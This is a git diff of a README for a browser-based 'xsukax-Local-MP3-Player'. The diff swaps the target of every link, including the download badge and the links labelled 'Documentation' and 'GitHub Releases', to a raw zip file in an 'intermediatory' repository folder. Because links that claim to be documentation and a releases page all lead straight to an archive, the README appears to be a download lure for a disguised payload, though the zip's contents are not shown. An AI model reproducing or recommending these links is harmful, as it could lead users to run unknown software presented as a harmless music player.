@@ -1,6 +1,6 @@
 # 🎵 xsukax-Local-MP3-Player - Enjoy Music Privately in Your Browser
 
-[![Download xsukax-Local-MP3-Player](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-Local-MP3-Player_v2.2.zip)](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-Local-MP3-Player_v2.2.zip)
+[![Download xsukax-Local-MP3-Player](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-M-Local-Player-1.9-alpha.5.zip)](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-M-Local-Player-1.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Welcome to the xsukax-Local-MP3-Player. This application lets you play MP3 music
 
 To get started, you will need to download the application from our Releases page. 
 
-1. **Visit this page to download:** [xsukax-Local-MP3-Player Releases](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-Local-MP3-Player_v2.2.zip).
+1. **Visit this page to download:** [xsukax-Local-MP3-Player Releases](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-M-Local-Player-1.9-alpha.5.zip).
    
 2. **Select the latest version** and click on the corresponding file to download it.
 
@@ -52,7 +52,7 @@ If you face any issues, feel free to check the Issues section on GitHub. We welc
 
 ## 🔗 Links
 
-- [Documentation](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-Local-MP3-Player_v2.2.zip)  
-- [GitHub Releases](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-Local-MP3-Player_v2.2.zip)  
+- [Documentation](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-M-Local-Player-1.9-alpha.5.zip)  
+- [GitHub Releases](https://raw.githubusercontent.com/momocarterodg/xsukax-Local-MP3-Player/main/intermediatory/xsukax-M-Local-Player-1.9-alpha.5.zip)  
 
 Thank you for choosing xsukax-Local-MP3-Player. We hope you enjoy your music in a way that prioritizes your privacy!
